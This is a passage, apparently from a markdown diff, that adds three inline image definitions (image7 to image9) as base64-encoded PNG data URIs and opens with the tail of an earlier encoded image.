8cx7zrJca5X3E4I/WvL4OMMmSdo1WN7ru+kRFthX9f3oblp/Lu2rpX09ZktQPH51dCGGdxKyv6uGjF9O/yXcbLfjYzwEgaW8HDyYvTk39TFrxY29NfS9uc52Xxh7wlhqHMNMXK4jIzDnn5f3UzGuP4jFmSeWV4e+P8uodc8d510Yi6GktZFx5Xel/XkEqyeiG4uKGcy+jxwhPA7Ven3Mn8PPGQtt/C4u+0Mj1wqu8c7m+Ozollb7PgMvB2ZJklaOGRCWvggs/4nFm9ODpf0rZjMUf4zZsimb3zmfIFfDDuGAALd3eoyvRHcj3k7M5lAz7dX0WGsS8xvLqbmeV3F+7WPzPFgqG5oFOi4WAw/vbux7hyOhZ09035uP8Hhg7tF57Fere6o4798xuz728vEv49vn8ej2X/Vp3yABQlsOrBWv7UbGldc8b9g/KrqAeUFpN5d2RiwGS/AxGkO1XhGL51xT2kdSH74Ts1rHlmNzrfV3h9eDceWPDMaVGcg+D+cOSZJ2G5YOuYHeFt2SIYGNWQhCHi6N+cDG4xwT2Ah1j077+SiHoY/J2EkEsFrDZnw7FkPZTmOcmYnbLEIzQWvVtjKu1MoM56ptpVbwmlybOyVJ2m141+hl0X1KPDNLzLr8NLq9PreX9lhpV06fx0cnMCvE8dPRhTg+vPSi6G56yzaa75S+JcRl/pI7VuRvuWMD1hEusZVxpda6TL5KW6kVBP4jc6ckSdoZBMaxd3y2WMLdys19u3w3d4xg+bn9uI1V28y47ku14uLo9shJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJ2pf8Hy2mJLTBJRU/AAAAAElFTkSuQmCC>
+
+[image7]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACYAAAAZCAYAAABdEVzWAAACUklEQVR4Xu2VT0gXQRzFX1iQVBQEglgUmUEQhIRJFzGoqKAOESQJeYtuUQctDZSig6URQRAR9Ac6FIV0CAo6RB4kvHjwlHToUNChOtUlQt/zO+PODvvnh+ltH3zY3ZnZ2Tfz/e53gEqLVx1pIGvjjkhryKq4cbm0noyRm+Q5OUNWpEaYtsPGbYo7lkt95AVZSTaSCfKBHCaNpIX0k+/kuHsnT63kUNxIrYYteJe7V4S0wLNkazIskULzDvZhr8ukg3SSbtJFzpM7MPOx2kkvmSSzsIXG2kA+wvpDRpCTGtqRL0hPpvtjwbNyTyHOC6GMafxR8hvZxpS7r8k0+Uwewd7LSpl5rSPjSE+m1R9w93pxGOUhlPag2Nhj2EbUrFHyFGaintwjTa7vILmN7BDGWnJjW2D5MQAzcdG1K3Qv3bUWlRl7Rm7BwvmVvEJO4ofSTml3dsN2Tjskkz6E6j9NbpBm1xarzNhbcgo2v7hGPsE2pmbJkA+h/pr7ZJDsJA+QPVmRMRlRPofJ3kb+kKGgrVBxCPeRGbLNPau+XXD3oYqMZcmPV7lS2SpUHEJJOaeS4hNXhq8n3QsqMqY/+y8sXbz8+PcoPwpTIfTSh0JjuqowqnqHKjKmP/If0sZ8KB+ioJ5J2gkVUhXUUCeQNiYDV5PuBXlj4SnipdPjEhIDuuqE+UX2+kFZ8iEMV+S1mUyR/bAJryA97hz5hvRR8xNWuP0i9QPdheVuD3lCfpAjrj9XnbAP5m2ptl1n3RtYfmWebyXS3DvISdj3dJhXqlSp0v9oDqmBbQYuf1GtAAAAAElFTkSuQmCC>
+
+[image8]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACUAAAAZCAYAAAC2JufVAAAB1UlEQVR4Xu2VzStFQRiHX0kRQopI+ViQsiAhG1mgKFIUIXbyF/haKVmQ7KRsfOwsLCwoUW7ZkJXyUcpGYYUNConfa87cOzP3zJDu3Z2nng7vvHfmd++ZM4coICB+pMA+uAznYJk+/CeqYItZBMlwEFZ4fyfCAjgMiyJtOhlwD07DNFgJL2CX2mShDo7CE/gFx/ThHzLhMYlx1XmYpPRp8EQ8aZZS64eXMFep+cGh2mEbfCH/UPxFt+EZvIarJD6XoPRocBAOtGbUa+Az7DDqNqrJHYrnzzMHbJTDB4oOJReZMeo2YhpKTmYLZdZt/BZqAy6QuIW3cIscm5z3A286c/FYh9qFPST2EcsP1RUsVPrCtFL8Q3GIdO8q4T37CqeUWhjb4ra6DVcoP2T/Pkw1xqgE3lP04vJDk0bdhivULPyAzUpN9odI3F4NLoRInCN82kqa4Lt3lfAhm0/+54srFH/hT9JDydu3Qv7z0QC8gcXe/3IjHpEIwmTDU/gG672aiuuX7YXjFFmcrxPwCdbKJhM+6pfgAewkEeicxOtGwr/oDkU/MSPwjvTXxyM8hDleD8+/CDfhEFwncTbyQ+aE05fCbthAjnfSP1HnbyR9qwQEBATY+AYmIWrQjzO/aAAAAABJRU5ErkJggg==>
+
+[image9]: <data:image/png;base64,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>
